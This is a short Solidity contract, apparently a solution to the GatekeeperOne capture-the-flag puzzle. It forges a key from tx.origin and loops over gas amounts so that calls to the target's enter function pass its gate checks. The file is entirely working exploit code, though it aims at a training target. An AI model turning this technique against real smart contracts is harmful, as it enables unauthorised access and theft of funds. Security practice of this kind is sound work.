// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperOneAttack {
    function attack(address _contract) public {
        uint64 key = 0;
        key = key ^ uint16(tx.origin);
        key = key ^ (1 << 32);
        for (uint i = 0; i < 8191; i++) {
            (bool x, ) = _contract.call.gas(25000 + i)(abi.encodeWithSignature("enter(bytes8)", key));
            if (x) {
                break;
            }
        }
    }
}